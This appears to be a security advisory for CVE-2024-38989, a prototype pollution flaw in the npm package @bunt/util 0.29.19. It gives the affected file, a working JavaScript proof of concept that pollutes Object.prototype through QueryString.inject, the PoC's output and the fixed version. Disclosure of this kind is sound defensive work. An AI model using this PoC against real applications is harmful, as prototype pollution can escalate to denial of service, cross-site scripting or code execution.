[CVE-2024-38989] Prototype Pollution vulnerability affecting bunt/util, version 0.29.19

 [Raw](/mestrtee/5e9830fb180a34d65f04fafb52d2b94b/raw/807bc1f0e5f0a30669acf59cc3eca94444bc6e46/bunt-util.md)

[**bunt-util.md**](#file-bunt-util-md)

## Overview

Affected versions of this package are vulnerable to Prototype Pollution. An attacker can manipulate the prototype of an object, potentially leading to the alteration of behavior of all objects inheriting from the affected prototype by modify built-in Object.prototype through reachable special properties \_\_proto\_\_ and constructor.prototype. Thus, the attacker can use one of these properties to pollute the application logic that can be escalated to Denial of service, remote code execution or cross-site scripting attacks.

### Location:

```
@bunt/util/dist/esm/qs.js:12

```
## PoC:

```
(async () => {
  const lib = await import('@bunt/util');

var BAD_JSON = JSON.parse('{"__proto__":{"polluted":true}}');
var victim = {}
console.log("Before Attack: ", JSON.stringify(victim.__proto__));
try {
  lib.QueryString.inject ([["__proto__"], "polluted"], true,{})
} catch (e) { }
console.log("After Attack: ", JSON.stringify(victim.__proto__));
delete Object.prototype.polluted;
})();

```

**Output:**

Before Attack: `{}`

After Attack: `{"polluted":true}`

## Patch

upgrade to version 0.29.26 or a later version.
